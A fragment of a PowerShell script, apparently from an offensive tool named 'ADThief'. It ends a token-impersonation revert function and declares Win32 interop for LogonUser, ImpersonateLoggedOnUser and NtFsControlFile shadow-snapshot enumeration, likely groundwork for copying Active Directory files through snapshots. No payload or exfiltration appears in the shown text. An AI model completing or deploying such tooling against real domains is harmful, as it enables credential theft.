        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Verbose "[RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        [ADThief.Win32]::CloseHandle($TokenHandle) | Out-Null
    }
    if (-not [ADThief.Win32]::RevertToSelf()) {
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "[RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
}

Add-Type -TypeDefinition @"
using Microsoft.Win32.SafeHandles;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace ADThief {
    public class Win32
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public UInt32 Status;
            public UInt32 Information;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct NT_Trans_Data
        {
            public UInt32 NumberOfSnapShots;
            public UInt32 NumberOfSnapShotsReturned;
            public UInt32 SnapShotArraySize;
        }
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern SafeFileHandle CreateFileW(
            string lpFileName,
            FileSystemRights dwDesiredAccess,
            FileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            FileMode dwCreationDisposition,
            UInt32 dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern UInt32 NtFsControlFile(
            SafeFileHandle hDevice,
            IntPtr Event,
            IntPtr ApcRoutine,
            IntPtr ApcContext,
            ref IO_STATUS_BLOCK IoStatusBlock,
            UInt32 FsControlCode,
            IntPtr InputBuffer,
            UInt32 InputBufferLength,
            IntPtr OutputBuffer,
            UInt32 OutputBufferLength);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool LogonUserA(
            string lpszUserName, 
            string lpszDomain,
            string lpszPassword,
            int dwLogonType, 
            int dwLogonProvider,
            ref IntPtr  phToken
        );
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool RevertToSelf();
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
}
"@
